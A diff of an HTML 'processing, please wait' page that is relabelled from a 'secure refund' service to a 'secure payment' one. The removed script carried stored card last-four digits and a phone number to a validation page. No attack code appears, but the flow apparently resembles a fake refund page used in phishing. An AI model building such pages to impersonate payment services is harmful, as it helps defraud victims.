@@ -84,7 +84,7 @@
     <div class="container">
         <!-- Icônes sécurisées -->
         <div class="secure-icons">
-            <img src="logo-paiement-securise (1).png" alt="Remboursement Sécurisé">
+            <img src="logo-paiement-securise (1).png" alt="Paiement Sécurisé">
         </div>
 
         <!-- Cercle de chargement -->
@@ -92,7 +92,7 @@
 
         <!-- Message principal -->
         <p class="message">
-            Merci de patienter, votre remboursement est en cours de traitement...
+            Merci de patienter, votre paiement est en cours de traitement...
         </p>
 
         <!-- Texte secondaire -->
@@ -102,20 +102,16 @@
 
         <!-- Pied de page -->
         <div class="footer">
-            © 2024 Service de Remboursement | Sécurité garantie | Tous droits réservés.
+            © 2024 Service de Paiement | Sécurité garantie | Tous droits réservés.
         </div>
     </div>
 
-    <!-- Script JavaScript للتوجيه بعد 5 ثوانٍ -->
+    <!-- Script JavaScript pour la redirection après 5 secondes -->
     <script>
         setTimeout(() => {
-            // تخزين البيانات لضمان وجودها عند التوجيه إلى الصفحة الثالثة
-            const lastFourDigits = localStorage.getItem('lastFourDigits') || '0000';
-            const phoneNumber = localStorage.getItem('phoneNumber') || 'Non renseigné';
-
-            // إعادة توجيه مع ضمان استمرار البيانات
-            window.location.href = "validation_payement.html";
-        }, 15000); // التوجيه بعد 5 ثوانٍ
+            // Redirection vers la page de confirmation de paiement
+            window.location.href = "confirmation_paiement.html"; // Remplace par ta page de confirmation
+        }, 15000); // Redirection après 15 secondes
     </script>
 </body>
 </html>
